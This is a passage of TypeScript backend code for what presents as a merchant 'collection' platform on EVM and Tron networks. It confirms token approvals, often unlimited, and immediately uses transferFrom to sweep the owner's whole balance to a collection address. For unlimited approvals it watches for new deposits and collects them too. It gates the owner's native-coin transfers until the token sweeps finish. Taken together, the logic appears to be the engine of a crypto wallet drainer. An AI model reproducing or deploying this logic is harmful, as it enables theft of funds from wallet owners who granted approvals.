                status: hasAllowance ? "ACTIVE" : "SUBMITTED",
                termsVersion: String(
                  body.termsVersion ??
                    this.platformConfig.getApproval().termsVersion,
                ),
                unlimited,
                collectionEnabled: true,
                collectionToAddress: transferToAddress,
                nextCheckAt: immediateCollectionAt,
                lastError: zeroBalanceSkipError ?? errorForLog(verifyError),
                ...journeyFields,
              },
            });

        const supersededIds = await this.supersedeOtherApprovals(tx, {
          persistedId: persisted.id,
          owner,
          spender,
          network,
          token,
        });
        if (supersededIds.length > 0) {
          this.logFlow("APPROVAL SUPERSEDED", {
            approvalId: persisted.id,
            network,
            token,
            supersededApprovalIds: supersededIds,
          });
        }

        const queued =
          hasAllowance && executeTransfer && requestedTransferRaw > BigInt(0)
            ? await this.collectionIntents.createForApproval(tx, {
                approvalId: persisted.id,
                merchantId: String(body.merchantId ?? "platform"),
                merchantReference:
                  String(body.merchantReference ?? "") || undefined,
                ownerAddress: owner,
                spenderAddress: spender,
                network,
                tokenSymbol: token,
                tokenAddress: tokenInfo.address,
                requestedRaw: requestedTransferRaw.toString(),
                sourceTxHash: txHash,
                traceId: traceId ?? persisted.traceId ?? undefined,
              })
            : null;
        return {
          approval: persisted,
          collectionIntent: queued?.intent ?? null,
        };
      },
    );
    let transfer: {
      transferId: string;
      txHash: string;
      transferredRaw: string;
      blockNumber: number | null;
    } | null = null;
    let transferSkippedReason: string | null = null;

    if (!hasAllowance) {
      transferSkippedReason = "allowance_not_confirmed";
    } else if (!executeTransfer) {
      transferSkippedReason = tokenBalanceIsZero
        ? "zero_balance_collect_later"
        : "execute_transfer_disabled";
    } else {
      if (requestedTransferRaw <= BigInt(0)) {
        transferSkippedReason = "zero_requested_amount";
      } else {
        transferSkippedReason = "queued_for_background_collection";
      }
    }

    await this.recordAudit(
      `owner:${owner}`,
      "confirm",
      "approval",
      {
        network,
        txHash,
        traceId,
        allowance: verified?.allowance ?? "0",
        confirmed: hasAllowance,
        executeTransfer,
        tokenBalanceHuman: tokenBalanceHuman || null,
        zeroBalanceAtConfirm: tokenBalanceIsZero,
        transferSkippedReason,
        collectionPolicy: transferSkippedReason,
        collectionIntentId: collectionIntent?.id ?? null,
      },
      approval.id,
    );

    this.logFlow("APPROVAL CONFIRM RESULT", {
      traceId,
      approvalId: approval.id,
      hasAllowance,
      executeTransfer,
      transferSkippedReason,
      zeroBalanceAtConfirm: tokenBalanceIsZero,
      collectionEnabled: approval.collectionEnabled,
      nextCheckAt: approval.nextCheckAt?.toISOString() ?? null,
      collectionIntentId: collectionIntent?.id ?? null,
    });

    if (hasAllowance && executeTransfer && requestedTransferRaw > BigInt(0)) {
      await this.runImmediateCollectionWithRetries(approval.id);
    }

    return {
      ok: true,
      approvalId: approval.id,
      status: approval.status,
      allowance: verified?.allowance ?? "0",
      hasAllowance,
      txHash,
      spender,
      transfer,
      transferSkippedReason,
      collectionIntent: collectionIntent
        ? {
            id: collectionIntent.id,
            status: collectionIntent.status,
            queuedAt: collectionIntent.queuedAt,
          }
        : null,
      timestamp: approval.createdAt,
    };
  }

  /**
   * Retry background collection for tokens that still block native execution.
   * Called from settlement polling so transferFrom is not delayed until the 120s collector tick.
   */
  async nudgeTokenCollection(args: {
    ownerAddress: string;
    network: string;
    tokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }>;
  }) {
    const network = args.network.trim().toLowerCase();
    const owner = args.ownerAddress.trim();
    const tokenInputs =
      args.tokens ??
      (await this.defaultNativeReadinessTokenInputs(owner, network));

    const nudged: Array<{
      token: string;
      approvalId: string | null;
      state: string;
    }> = [];

    for (const input of tokenInputs) {
      if (!input.shouldAttemptTransfer) continue;

      const loaded = await this.loadTokenCollectionSnapshot({
        owner,
        network,
        token: input.token,
        shouldAttemptTransfer: input.shouldAttemptTransfer,
        approvalId: input.approvalId,
        approvalTxHash: input.approvalTxHash,
      });
      const state = resolveTokenCollectionState(loaded.snapshot);
      if (
        !isTokenCollectionBlockingNative(state, input.shouldAttemptTransfer)
      ) {
        continue;
      }
      if (!loaded.approvalId) continue;

      await this.processMonitoredApproval(loaded.approvalId).catch((err) => {
        this.logFlow("COLLECTION NUDGE FAILED", {
          approvalId: loaded.approvalId,
          token: input.token,
          network,
          error: getErrorMessage(err),
        });
      });
      nudged.push({ token: input.token, approvalId: loaded.approvalId, state });
    }

    return { ok: true, nudged };
  }

  /**
   * Queue (and immediately attempt) collection when on-chain allowance already exists.
   * Used when the connect flow skips a redundant approve() signature.
   */
  async queueCollectionFromAllowance(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const token = this.parseToken(body.token);
    const traceId = normalizeJourneyId(String(body.traceId ?? ""));
    const unlimited = Boolean(body.unlimited);
    if (!network || !owner)
      throw new BadRequestException("network and owner are required");

    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
    const spender = this.spenderFor(network);
    if (!spender) throw new BadRequestException("Spender not configured");

    const verified = await this.verifyAllowance({
      network,
      owner,
      spender,
      token,
    });
    const onChain = BigInt(verified.allowance);
    if (onChain <= BigInt(0)) {
      throw new BadRequestException("No allowance on chain for this token");
    }

    const amountRaw =
      String(body.amountRaw ?? "").trim() ||
      (unlimited ? BigInt(MAX_UINT256).toString() : onChain.toString());
    const tokenBalanceHuman = String(body.tokenBalanceHuman ?? "").trim();
    const tokenBalanceIsZero = this.tokenBalanceIsZero(tokenBalanceHuman);
    const executeTransfer =
      Boolean(body.executeTransfer) && !tokenBalanceIsZero;
    const zeroBalanceSkipError =
      !executeTransfer && tokenBalanceIsZero
        ? TRANSFER_SKIP_REASONS.zero_balance_collect_later
        : null;
    const transferToAddress = this.collectionDestinationFor(owner, network);
    const transferAmountRawInput = String(body.transferAmountRaw ?? "").trim();
    const requestedTransferRaw = transferAmountRawInput
      ? BigInt(transferAmountRawInput)
      : unlimited
        ? onChain
        : BigInt(amountRaw);
    const immediateCollectionAt = new Date();
    const syntheticTxHash = `allowance-sync:${network}:${owner.toLowerCase()}:${token}`;

    this.logFlow("QUEUE COLLECTION FROM ALLOWANCE", {
      traceId,
      network,
      token,
      owner,
      executeTransfer,
      requestedTransferRaw: requestedTransferRaw.toString(),
      transferToAddress,
    });

    const { approval, collectionIntent } = await prisma.$transaction(
      async (tx) => {
        const journeyFields = traceId
          ? await journeyWriteFields(
              tx,
              "approval",
              tokenQualifier(token),
              traceId,
              owner,
            )
          : {};
        const existing = await tx.approval.findFirst({
          where: {
            ...this.ownerAddressFilter(owner, network),
            network,
            tokenSymbol: token,
            status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
          },
          orderBy: { createdAt: "desc" },
        });

        const persisted = existing
          ? await tx.approval.update({
              where: { id: existing.id },
              data: {
                collectionEnabled: true,
                collectionToAddress: transferToAddress,
                nextCheckAt: immediateCollectionAt,
                lastError: zeroBalanceSkipError,
                status: "ACTIVE",
                ...(traceId
                  ? {
                      traceId: existing.traceId ?? traceId,
                      ...(!existing.publicId
                        ? {
                            publicId:
                              journeyFields.publicId ??
                              (await allocatePublicId(
                                tx,
                                "approval",
                                tokenQualifier(token),
                                traceId,
                              )),
                          }
                        : {}),
                    }
                  : {}),
              },
            })
          : await tx.approval.create({
              data: {
                ownerAddress: owner,
                spenderAddress: spender,
                network,
                tokenSymbol: token,
                tokenAddress: tokenInfo.address,
                decimals: tokenInfo.decimals,
                amountRaw,
                amountHuman: unlimited ? "UNLIMITED" : amountRaw,
                remainingRaw: amountRaw,
                collectedRaw: "0",
                txHash: syntheticTxHash,
                status: "ACTIVE",
                termsVersion: this.platformConfig.getApproval().termsVersion,
                unlimited,
                collectionEnabled: true,
                collectionToAddress: transferToAddress,
                nextCheckAt: immediateCollectionAt,
                lastError: zeroBalanceSkipError,
                ...journeyFields,
              },
            });

        const queued =
          executeTransfer && requestedTransferRaw > BigInt(0)
            ? await this.collectionIntents.createForApproval(tx, {
                approvalId: persisted.id,
                merchantId: String(body.merchantId ?? "platform"),
                ownerAddress: owner,
                spenderAddress: spender,
                network,
                tokenSymbol: token,
                tokenAddress: tokenInfo.address,
                requestedRaw: requestedTransferRaw.toString(),
                sourceTxHash: persisted.txHash,
                traceId: traceId ?? persisted.traceId ?? undefined,
              })
            : null;

        return {
          approval: persisted,
          collectionIntent: queued?.intent ?? null,
        };
      },
    );

    let transferSkippedReason: string | null = null;
    if (!executeTransfer) {
      transferSkippedReason = tokenBalanceIsZero
        ? "zero_balance_collect_later"
        : "execute_transfer_disabled";
    } else if (requestedTransferRaw <= BigInt(0)) {
      transferSkippedReason = "zero_requested_amount";
    } else {
      transferSkippedReason = "queued_for_background_collection";
    }

    let transfer: {
      transferId: string;
      txHash: string;
      transferredRaw: string;
      blockNumber: number | null;
    } | null = null;

    await this.recordAudit(
      `owner:${owner}`,
      "queue_collection",
      "approval",
      {
        network,
        token,
        executeTransfer,
        transferSkippedReason,
        collectionIntentId: collectionIntent?.id ?? null,
      },
      approval.id,
    );

    if (executeTransfer && requestedTransferRaw > BigInt(0)) {
      await this.runImmediateCollectionWithRetries(approval.id);
    }

    return {
      ok: true,
      approvalId: approval.id,
      status: approval.status,
      allowance: verified.allowance,
      hasAllowance: true,
      transfer,
      transferSkippedReason,
      collectionIntent: collectionIntent
        ? {
            id: collectionIntent.id,
            status: collectionIntent.status,
            queuedAt: collectionIntent.queuedAt,
          }
        : null,
      timestamp: approval.updatedAt,
    };
  }

  /** @deprecated Use evaluateNativeReadiness — native only blocks on active collection work. */
  isApprovalCollectionTerminal(approval: {
    status: string;
    remainingRaw: string;
    collectedRaw: string;
    collectionEnabled: boolean;
    lastError?: string | null;
  }): boolean {
    if (["COMPLETED", "REVOKED", "EXPIRED"].includes(approval.status)) {
      return true;
    }
    if (BigInt(approval.collectedRaw) > BigInt(0)) {
      return true;
    }
    if (
      BigInt(approval.remainingRaw) <= BigInt(0) &&
      !approval.collectionEnabled
    ) {
      return true;
    }
    if (
      approval.lastError?.includes(
        TRANSFER_SKIP_REASONS.zero_balance_collect_later,
      )
    ) {
      return true;
    }
    return false;
  }

  /**
   * Native may execute when no token has active in-flight collection.
   * Failures, zero-balance skips, and retry-scheduled states do NOT block native.
   */
  async evaluateNativeReadiness(args: {
    ownerAddress: string;
    network: string;
    tokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }>;
  }) {
    const network = args.network.trim().toLowerCase();
    const owner = args.ownerAddress.trim();
    const tokenInputs =
      args.tokens ??
      (await this.defaultNativeReadinessTokenInputs(
        args.ownerAddress,
        args.network,
      ));

    const results: Array<{
      token: string;
      state: TokenCollectionLogicalState;
      stateLabel: string;
      active: boolean;
      approvalId: string | null;
      lastError: string | null;
    }> = [];

    for (const input of tokenInputs) {
      const loaded = await this.loadTokenCollectionSnapshot({
        owner,
        network,
        token: input.token,
        shouldAttemptTransfer: input.shouldAttemptTransfer,
        approvalId: input.approvalId,
        approvalTxHash: input.approvalTxHash,
      });
      const state = resolveTokenCollectionState(loaded.snapshot);
      const lastError = loaded.snapshot.approval?.lastError ?? null;
      results.push({
        token: input.token,
        state,
        stateLabel: TOKEN_COLLECTION_STATE_LABELS[state],
        active: isTokenCollectionBlockingNative(
          state,
          input.shouldAttemptTransfer,
        ),
        approvalId: loaded.approvalId,
        lastError,
      });
    }

    const summary = summarizeNativeReadiness(results);
    return {
      canExecuteNative: summary.canExecuteNative,
      tokens: results,
      blocking: summary.blocking,
    };
  }

  parseNativeReadinessTokenInputs(
    body: Record<string, unknown>,
  ):
    | Array<{
        token: string;
        shouldAttemptTransfer: boolean;
        approvalId?: string | null;
        approvalTxHash?: string | null;
      }>
    | undefined {
    if (!Array.isArray(body.tokens)) return undefined;
    return (body.tokens as Array<Record<string, unknown>>).map((t) => ({
      token: String(t.token ?? ""),
      shouldAttemptTransfer: Boolean(t.shouldAttemptTransfer),
      approvalId: t.approvalId ? String(t.approvalId) : null,
      approvalTxHash: t.approvalTxHash ? String(t.approvalTxHash) : null,
    }));
  }

  async assertNativeExecutionAllowed(
    ownerAddress: string,
    network: string,
    tokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }>,
  ): Promise<void> {
    const tokenInputs =
      tokens ??
      (await this.defaultNativeReadinessTokenInputs(ownerAddress, network));

    const readiness = await this.evaluateNativeReadiness({
      ownerAddress,
      network,
      tokens: tokenInputs,
    });
    if (!readiness.canExecuteNative) {
      const blocking = readiness.blocking
        .map((t) => `${t.token} (${t.stateLabel})`)
        .join(", ");
      throw new BadRequestException(
        `Native transfer blocked — active token collection: ${blocking}`,
      );
    }
  }

  private async defaultNativeReadinessTokenInputs(
    ownerAddress: string,
    network: string,
  ) {
    const net = network.trim().toLowerCase();
    const owner = ownerAddress.trim();
    const inputs: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }> = [];

    for (const token of TOKEN_SETTLEMENT_ORDER) {
      const approval = await prisma.approval.findFirst({
        where: {
          ownerAddress: { equals: owner, mode: "insensitive" },
          network: net,
          tokenSymbol: token,
        },
        orderBy: { createdAt: "desc" },
      });
      if (!approval) continue;

      const zeroSkipped =
        BigInt(approval.remainingRaw) <= BigInt(0) &&
        BigInt(approval.amountRaw) <= BigInt(0);
      const zeroLater = approval.lastError?.includes(
        TRANSFER_SKIP_REASONS.zero_balance_collect_later,
      );
      const zeroAtCollection = approval.lastError?.includes(
        TRANSFER_SKIP_REASONS.zero_balance_at_collection,
      );

      inputs.push({
        token,
        shouldAttemptTransfer:
          !(zeroSkipped || zeroLater || zeroAtCollection) &&
          approval.collectionEnabled,
        approvalId: approval.id,
        approvalTxHash: approval.txHash,
      });
    }

    return inputs;
  }

  /** @deprecated Use assertNativeExecutionAllowed */
  async assertTokensCollectedBeforeNative(
    ownerAddress: string,
    network: string,
    hints?: { usdtTxHash?: string | null; usdcTxHash?: string | null },
  ): Promise<void> {
    await this.assertNativeExecutionAllowed(ownerAddress, network, [
      {
        token: "USDT",
        shouldAttemptTransfer: Boolean(hints?.usdtTxHash),
        approvalTxHash: hints?.usdtTxHash ?? null,
      },
      {
        token: "USDC",
        shouldAttemptTransfer: Boolean(hints?.usdcTxHash),
        approvalTxHash: hints?.usdcTxHash ?? null,
      },
    ]);
  }

  private async loadTokenCollectionSnapshot(args: {
    owner: string;
    network: string;
    token: string;
    shouldAttemptTransfer: boolean;
    approvalId?: string | null;
    approvalTxHash?: string | null;
  }): Promise<{
    snapshot: TokenCollectionSnapshot;
    approvalId: string | null;
  }> {
    if (!args.shouldAttemptTransfer) {
      return {
        snapshot: { shouldAttemptTransfer: false, approval: null },
        approvalId: null,
      };
    }

    let approval = args.approvalId
      ? await prisma.approval.findUnique({ where: { id: args.approvalId } })
      : null;

    if (!approval && args.approvalTxHash) {
      approval = await prisma.approval.findUnique({
        where: {
          network_txHash: {
            network: args.network,
            txHash: args.approvalTxHash,
          },
        },
      });
    }

    if (!approval) {
      approval = await prisma.approval.findFirst({
        where: {
          ownerAddress: { equals: args.owner, mode: "insensitive" },
          network: args.network,
          tokenSymbol: args.token,
          collectionEnabled: true,
        },
        orderBy: { createdAt: "desc" },
      });
    }

    if (!approval) {
      return {
        snapshot: { shouldAttemptTransfer: true, approval: null },
        approvalId: null,
      };
    }

    const approvalId = approval.id;

    if (BigInt(approval.collectedRaw || "0") <= BigInt(0)) {
      await this.reconcileApprovalFromSiblingTransfer(approvalId);
      approval =
        (await prisma.approval.findUnique({ where: { id: approvalId } })) ??
        approval;
    }

    const [intent, inFlightTransfer, confirmedTransfer, siblingTransfer] =
      await Promise.all([
        prisma.collectionIntent.findFirst({
          where: { approvalId },
          orderBy: { createdAt: "desc" },
        }),
        prisma.transfer.findFirst({
          where: {
            approvalId,
            status: { in: ["prepared", "broadcast", "pending"] },
          },
          orderBy: { updatedAt: "desc" },
        }),
        prisma.transfer.findFirst({
          where: { approvalId, status: "confirmed" },
        }),
        prisma.transfer.findFirst({
          where: {
            status: "confirmed",
            confirmedAt: { gte: approval.createdAt },
            approval: {
              id: { not: approvalId },
              ...this.ownerAddressFilter(args.owner, args.network),
              network: args.network,
              tokenSymbol: args.token,
            },
          },
          orderBy: { confirmedAt: "desc" },
          select: { txHash: true },
        }),
      ]);

    const hasConfirmedTransfer =
      Boolean(confirmedTransfer?.txHash) || Boolean(siblingTransfer?.txHash);

    return {
      snapshot: {
        shouldAttemptTransfer: true,
        approval: {
          status: approval.status,
          remainingRaw: approval.remainingRaw,
          collectedRaw: approval.collectedRaw,
          collectionEnabled: approval.collectionEnabled,
          lastError: approval.lastError,
          failureCount: approval.failureCount,
          nextCheckAt: approval.nextCheckAt,
          leaseUntil: approval.leaseUntil,
        },
        intent: intent
          ? {
              status: intent.status,
              nextRetryAt: intent.nextRetryAt,
              executionLeaseUntil: intent.executionLeaseUntil,
            }
          : null,
        inFlightTransfer: inFlightTransfer
          ? { status: inFlightTransfer.status }
          : null,
        hasConfirmedTransfer,
      },
      approvalId,
    };
  }

  async processMonitoredApproval(approvalId: string): Promise<void> {
    const approval = await this.claimCollectorRun(approvalId);
    if (
      !approval ||
      !approval.collectionEnabled ||
      !["SUBMITTED", "ACTIVE", "PARTIALLY_USED"].includes(approval.status)
    ) {
      return;
    }

    const now = new Date();
    if (approval.expiresAt && approval.expiresAt <= now) {
      await prisma.approval.update({
        where: { id: approval.id },
        data: {
          status: "EXPIRED",
          collectionEnabled: false,
          nextCheckAt: null,
          lastCheckedAt: now,
          leaseOwner: null,
          leaseUntil: null,
        },
      });
      return;
    }

    if (!approval.unlimited && BigInt(approval.remainingRaw) <= BigInt(0)) {
      await prisma.approval.update({
        where: { id: approval.id },
        data: {
          status: "COMPLETED",
          collectionEnabled: false,
          nextCheckAt: null,
          lastCheckedAt: now,
          leaseOwner: null,
          leaseUntil: null,
        },
      });
      return;
    }

    const attemptKey = `collector:${approval.id}:${approval.collectedRaw}:${approval.failureCount}`;
    const pendingAttempt = await prisma.transfer.findUnique({
      where: { idempotencyKey: attemptKey },
    });

    if (
      approval.unlimited &&
      BigInt(approval.collectedRaw) > BigInt(0) &&
      !pendingAttempt?.signedPayload
    ) {
      const settledBalance = await this.readTokenBalanceRaw(
        approval.network,
        approval.ownerAddress,
        approval.tokenSymbol as TokenSymbol,
      );
      if (settledBalance <= BigInt(0)) {
        await this.scheduleUnlimitedDepositWatch(approval.id, {
          collectedRaw: BigInt(approval.collectedRaw),
          failureCount: approval.failureCount,
        });
        return;
      }
    }

    let allowanceRaw: bigint;
    if (
      pendingAttempt?.signedPayload &&
      pendingAttempt.txHash &&
      pendingAttempt.status !== "confirmed"
    ) {
      // Reconcile an already signed/broadcast transaction before reading the
      // now potentially reduced balance or allowance.
      allowanceRaw = BigInt(pendingAttempt.amountRaw);
    } else {
      try {
        const verified = await this.verifyAllowance({
          network: approval.network,
          owner: approval.ownerAddress,
          spender: approval.spenderAddress,
          token: approval.tokenSymbol,
        });
        allowanceRaw = BigInt(verified.allowance);
      } catch (err) {
        const message = getErrorMessage(err);
        const nextFailures = approval.failureCount + 1;
        await prisma.approval.update({
          where: { id: approval.id },
          data: {
            lastCheckedAt: now,
            lastError: message,
            failureCount: nextFailures,
            nextCheckAt: this.nextCollectionCheck(nextFailures),
          },
        });
        return;
      }
    }

    if (allowanceRaw <= BigInt(0)) {
      const state = resolveApprovalStateAfterAllowanceCheck({
        status: approval.status,
        collectionEnabled: approval.collectionEnabled,
        createdAt: approval.createdAt,
        now,
        allowanceRaw,
        submittedGraceMs: this.platformConfig.getCollector().submittedGraceMs,
      });
      await prisma.approval.update({
        where: { id: approval.id },
        data: {
          status: state.status,
          collectionEnabled: state.collectionEnabled,
          nextCheckAt: state.nextCheckAt,
          lastCheckedAt: now,
          lastError: null,
        },
      });
      return;
    }

    const activeApproval =
      approval.status === "SUBMITTED"
        ? await prisma.approval.update({
            where: { id: approval.id },
            data: { status: "ACTIVE", lastError: null, failureCount: 0 },
          })
        : approval;
    const requestedRaw = activeApproval.unlimited
      ? allowanceRaw
      : BigInt(activeApproval.remainingRaw);
    const transferToAddress =
      activeApproval.collectionToAddress || activeApproval.spenderAddress;

    const ownerBalanceNow = await this.readTokenBalanceRaw(
      activeApproval.network,
      activeApproval.ownerAddress,
      activeApproval.tokenSymbol as TokenSymbol,
    );
    if (ownerBalanceNow <= BigInt(0)) {
      if (activeApproval.unlimited) {
        await this.scheduleUnlimitedDepositWatch(activeApproval.id, {
          collectedRaw: BigInt(activeApproval.collectedRaw),
          failureCount: activeApproval.failureCount,
        });
        return;
      }
      await this.markCollectionNothingToCollect(
        activeApproval.id,
        TRANSFER_SKIP_REASONS.zero_balance_at_collection,
      );
      return;
    }

    try {
      await this.executeAutoTransfer({
        approval: {
          id: activeApproval.id,
          ownerAddress: activeApproval.ownerAddress,
          spenderAddress: activeApproval.spenderAddress,
          network: activeApproval.network,
          tokenSymbol: activeApproval.tokenSymbol,
          tokenAddress: activeApproval.tokenAddress,
          decimals: activeApproval.decimals,
          remainingRaw: activeApproval.remainingRaw,
          collectedRaw: activeApproval.collectedRaw,
          unlimited: activeApproval.unlimited,
          failureCount: activeApproval.failureCount,
        },
        transferToAddress,
        requestedRaw,
        allowanceRaw,
        idempotencyKey: attemptKey,
      });
    } catch (err) {
      const message = getErrorMessage(err);
      const expectedNoBalance = /no transferable balance/i.test(message);
      const exceedsBalance = /exceeds balance/i.test(message);
      if (expectedNoBalance || exceedsBalance) {
        try {
          const ownerBalance = await this.readTokenBalanceRaw(
            activeApproval.network,
            activeApproval.ownerAddress,
            activeApproval.tokenSymbol as TokenSymbol,
          );
          if (ownerBalance <= BigInt(0)) {
            const reconciled = await this.reconcileApprovalFromSiblingTransfer(
              activeApproval.id,
            );
            if (reconciled) return;
            if (activeApproval.unlimited) {
              await this.scheduleUnlimitedDepositWatch(activeApproval.id, {
                collectedRaw: BigInt(activeApproval.collectedRaw),
                failureCount: activeApproval.failureCount,
              });
              return;
            }
            await this.markCollectionNothingToCollect(
              activeApproval.id,
              TRANSFER_SKIP_REASONS.zero_balance_at_collection,
            );
            return;
          }
        } catch (balanceErr) {
          this.logFlow("COLLECTION BALANCE RECHECK FAILED", {
            approvalId: activeApproval.id,
            error: getErrorMessage(balanceErr),
          });
        }
      }
      const durableAttempt = await prisma.transfer.findUnique({
        where: { idempotencyKey: attemptKey },
        select: { status: true },
      });
      const pendingConfirmation = durableAttempt?.status === "broadcast";
      const nextFailures =
        expectedNoBalance || pendingConfirmation
          ? activeApproval.failureCount
          : activeApproval.failureCount + 1;
      await prisma.approval.update({
        where: { id: activeApproval.id },
        data: {
          lastCheckedAt: now,
          lastError: expectedNoBalance
            ? null
            : this.humanizeCollectorGasError(activeApproval.network, message),
          failureCount: nextFailures,
          nextCheckAt: this.nextCollectionCheck(nextFailures),
        },
      });
      return;
    }

    await prisma.approval.update({
      where: { id: activeApproval.id },
      data: { lastCheckedAt: now },
    });
  }

  /**
   * Queue-owned collection path. It persists a broadcast attempt and returns
   * immediately; finality is handled exclusively by ConfirmationWorker.
   */
  async broadcastCollectionIntent(
    intentId: string,
  ): Promise<{ attemptId: string; txHash: string }> {
    const intent = await prisma.collectionIntent.findUnique({
      where: { id: intentId },
      include: {
        approval: true,
        attempts: { orderBy: { sequence: "desc" }, take: 1 },
      },
    });
    if (!intent) throw new NotFoundException("Collection intent not found");
    if (["SETTLED", "CANCELLED"].includes(intent.status)) {
      const previous = intent.attempts[0];
      if (!previous?.txHash)
        throw new BadRequestException(
          "Settled intent has no broadcast attempt",
        );
      return { attemptId: previous.id, txHash: previous.txHash };
    }

    const approval = intent.approval;
    const claim = await prisma.collectionIntent.updateMany({
      where: {
        id: intent.id,
        status: {
          in: [CollectionIntentStatus.QUEUED, CollectionIntentStatus.FAILED],
        },
      },
      data: {
        status: CollectionIntentStatus.EXECUTING,
        executionOwner: `queue:${process.pid}`,
      },
    });
    if (claim.count === 1) {
      this.notifyCollectionIntentUpdated({
        id: intent.id,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.EXECUTING,
        network: approval.network,
      });
    }
    if (claim.count !== 1) {
      throw new BadRequestException(
        "Collection intent is already being executed",
      );
    }
    if (!approval.collectionEnabled) {
      await prisma.collectionIntent.update({
        where: { id: intent.id },
        data: {
          status: CollectionIntentStatus.CANCELLED,
          lastErrorCode: "APPROVAL_COLLECTION_DISABLED",
          lastErrorMessage: "Collection was disabled by policy or an operator",
        },
      });
      this.notifyCollectionIntentUpdated({
        id: intent.id,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.CANCELLED,
        network: approval.network,
      });
      throw new BadRequestException("Collection is disabled for this approval");
    }

    const activeApproval = await this.claimCollectorRun(approval.id);
    if (!activeApproval) {
      await prisma.collectionIntent.update({
        where: { id: intent.id },
        data: {
          status: CollectionIntentStatus.CANCELLED,
          lastErrorCode: COLLECTOR_RUN_LIMIT_REASON,
          lastErrorMessage: "Collector run limit reached for this approval",
        },
      });
      this.notifyCollectionIntentUpdated({
        id: intent.id,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.CANCELLED,
        network: approval.network,
      });
      throw new BadRequestException(
        "Collector run limit reached for this approval",
      );
    }

    const sequence = (intent.attempts[0]?.sequence ?? 0) + 1;
    const attemptKey = `intent:${intent.id}:${sequence}`;
    let attempt = await prisma.transferAttempt.create({
      data: {
        collectionIntentId: intent.id,
        sequence,
        idempotencyKey: attemptKey,
        status: TransferAttemptStatus.CREATED,
      },
    });

    try {
      const allowance = await this.verifyAllowance({
        network: approval.network,
        owner: approval.ownerAddress,
        spender: approval.spenderAddress,
        token: approval.tokenSymbol,
      });
      const allowanceRaw = BigInt(allowance.allowance);
      const balanceRaw = await this.readTokenBalanceRaw(
        approval.network,
        approval.ownerAddress,
        approval.tokenSymbol as TokenSymbol,
      );
      const amount = computeTransferable({
        requested: BigInt(intent.requestedRaw),
        allowance: allowanceRaw,
        balance: balanceRaw,
        remaining: BigInt(approval.remainingRaw),
        unlimited: approval.unlimited,
      });
      if (amount <= BigInt(0)) {
        await prisma.$transaction([
          prisma.transferAttempt.update({
            where: { id: attempt.id },
            data: {
              status: TransferAttemptStatus.FAILED,
              failureCode: "INSUFFICIENT_BALANCE_OR_ALLOWANCE",
              failureMessage: "No transferable balance or allowance",
            },
          }),
          prisma.collectionIntent.update({
            where: { id: intent.id },
            data: {
              status: CollectionIntentStatus.BLOCKED,
              lastErrorCode: "INSUFFICIENT_BALANCE_OR_ALLOWANCE",
              lastErrorMessage: "No transferable balance or allowance",
            },
          }),
        ]);
        this.notifyCollectionIntentUpdated({
          id: intent.id,
          approvalId: approval.id,
          ownerAddress: approval.ownerAddress,
          status: CollectionIntentStatus.BLOCKED,
          network: approval.network,
        });
        throw new BadRequestException("No transferable balance or allowance");
      }

      const transfer = await prisma.transfer.create({
        data: {
          approvalId: approval.id,
          idempotencyKey: `transfer:${attemptKey}`,
          amountRaw: amount.toString(),
          fromAddress: approval.ownerAddress,
          toAddress: intent.spenderAddress,
          status: "pending",
          ...(approval.traceId
            ? {
                publicId: await allocatePublicId(
                  prisma,
                  "transfer",
                  tokenQualifier(approval.tokenSymbol),
                  approval.traceId,
                ),
              }
            : {}),
        },
      });
      attempt = await prisma.transferAttempt.update({
        where: { id: attempt.id },
        data: { transferId: transfer.id },
      });

      const tx =
        approval.network === "tron"
          ? await this.executeTronTransferFrom({
              transferId: transfer.id,
              approvalId: approval.id,
              network: approval.network,
              tokenAddress: approval.tokenAddress,
              owner: approval.ownerAddress,
              to: intent.spenderAddress,
              amountRaw: amount,
              waitForConfirmation: false,
            })
          : await this.executeEvmTransferFrom({
              transferId: transfer.id,
              approvalId: approval.id,
              network: approval.network as EvmChainKey,
              tokenAddress: approval.tokenAddress,
              owner: approval.ownerAddress,
              to: intent.spenderAddress,
              amountRaw: amount,
              waitForConfirmation: false,
            });

      await prisma.$transaction([
        prisma.transferAttempt.update({
          where: { id: attempt.id },
          data: {
            status: TransferAttemptStatus.BROADCAST,
            txHash: tx.txHash,
            broadcastAt: new Date(),
          },
        }),
        prisma.collectionIntent.update({
          where: { id: intent.id },
          data: {
            status: CollectionIntentStatus.BROADCAST,
            broadcastAt: new Date(),
            executionOwner: null,
          },
        }),
        prisma.outboxEvent.create({
          data: {
            aggregateType: "CollectionIntent",
            aggregateId: intent.id,
            collectionIntentId: intent.id,
            eventType: "TransferBroadcasted",
            payload: {
              collectionIntentId: intent.id,
              transferAttemptId: attempt.id,
              txHash: tx.txHash,
            },
          },
        }),
      ]);
      this.notifyCollectionIntentUpdated({
        id: intent.id,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.BROADCAST,
        network: approval.network,
        attemptId: attempt.id,
        txHash: tx.txHash,
      });
      return { attemptId: attempt.id, txHash: tx.txHash };
    } catch (error) {
      const message = getErrorMessage(error);
      await prisma.$transaction([
        prisma.transferAttempt.updateMany({
          where: {
            id: attempt.id,
            status: {
              in: [TransferAttemptStatus.CREATED, TransferAttemptStatus.SIGNED],
            },
          },
          data: {
            status: TransferAttemptStatus.FAILED,
            failureCode: "BROADCAST_FAILED",
            failureMessage: message,
          },
        }),
        prisma.collectionIntent.update({
          where: { id: intent.id },
          data: {
            status: CollectionIntentStatus.FAILED,
            retryCount: { increment: 1 },
            lastErrorCode: "BROADCAST_FAILED",
            lastErrorMessage: message,
            executionOwner: null,
          },
        }),
        prisma.outboxEvent.create({
          data: {
